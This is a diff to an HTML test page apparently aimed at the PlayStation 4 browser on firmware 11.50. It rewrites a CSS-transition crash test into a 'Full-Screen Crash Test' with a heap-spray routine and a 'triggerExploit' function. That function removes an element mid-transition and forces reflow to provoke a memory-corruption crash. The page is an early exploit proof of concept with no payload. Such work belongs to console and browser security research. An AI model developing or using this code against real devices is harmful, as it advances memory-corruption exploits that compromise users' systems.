@@ -1,28 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 11.50 - History/Frame Lifecycle Test</title>
+  <title>PS4 Full-Screen Crash Test</title>
+  <style>
+    #box {
+      width: 100px;
+      height: 100px;
+      background: red;
+      transition: all 1s;
+    }
+    #status {
+      font-family: Arial;
+      color: white;
+      background: black;
+      padding: 10px;
+    }
+  </style>
 </head>
-<body>
+<body style="background: #000;">
+  <div id="box"></div>
+  <div id="status">Waiting for interaction...</div>
 
-<div id="box" style="width:100px;height:100px;background:red;transition:all 1s"></div>
+  <script>
+    const box = document.getElementById('box');
+    const status = document.getElementById('status');
 
-<script>
-  const box = document.getElementById('box');
+    // Heap spray (attempt to control memory layout)
+    function heapSpray() {
+      const spray = new Array(1000);
+      for (let i = 0; i < spray.length; i++) {
+        spray[i] = new ArrayBuffer(0x10000); // Allocate memory
+      }
+      return spray;
+    }
 
-  // Trigger layout
-  getComputedStyle(box).transform;
+    // Main exploit test
+    function triggerExploit() {
+      status.textContent = "Triggering transition...";
+      
+      // Force layout calculation
+      getComputedStyle(box).transform;
 
-  // Start transition
-  box.style.transform = 'translateX(100px)';
+      // Start CSS transition
+      box.style.transform = 'translateX(300px)';
 
-  // Remove during animation
-  setTimeout(() => {
-    box.remove();
-    // Force layout
-    document.body.offsetHeight;
-    location.href = "?css=1";
-  }, 50);
-</script>
+      // Remove element mid-transition
+      setTimeout(() => {
+        status.textContent = "Removing element...";
+        box.remove();
+
+        // Force reflow (layout thrashing)
+        document.body.offsetHeight;
+
+        // Optional: Reload (may worsen crash)
+        // location.href = "?crash=1";
+
+        // Enter full-screen (if possible)
+        status.textContent = "Try FULLSCREEN NOW! (Crash on exit)";
+      }, 50);
+    }
+
+    // Start test after user clicks (avoid auto-triggering)
+    status.textContent = "CLICK ANYWHERE TO START TEST";
+    document.body.addEventListener('click', () => {
+      heapSpray();
+      triggerExploit();
+    });
+  </script>
 </body>
 </html>
